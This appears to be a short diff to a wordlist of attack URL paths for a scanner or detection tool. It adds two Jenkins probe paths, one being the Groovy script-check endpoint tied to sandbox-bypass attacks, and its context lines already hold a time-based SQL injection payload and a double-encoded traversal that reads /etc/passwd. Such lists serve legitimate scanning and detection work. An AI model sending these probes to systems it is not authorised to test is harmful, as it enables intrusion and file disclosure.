@@ -1,3 +1,5 @@
+/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript
+/securityRealm/user/admin/
 /api/v3/activities/1)%20AND%203281%3d(SELECT%203281%20FROM%20PG_SLEEP(1))%20AND%20(7777%3d7777
 /addsensor5.htm
 /foo/default/master/..%252F..%252F..%252F..%252Fetc%252fpasswd
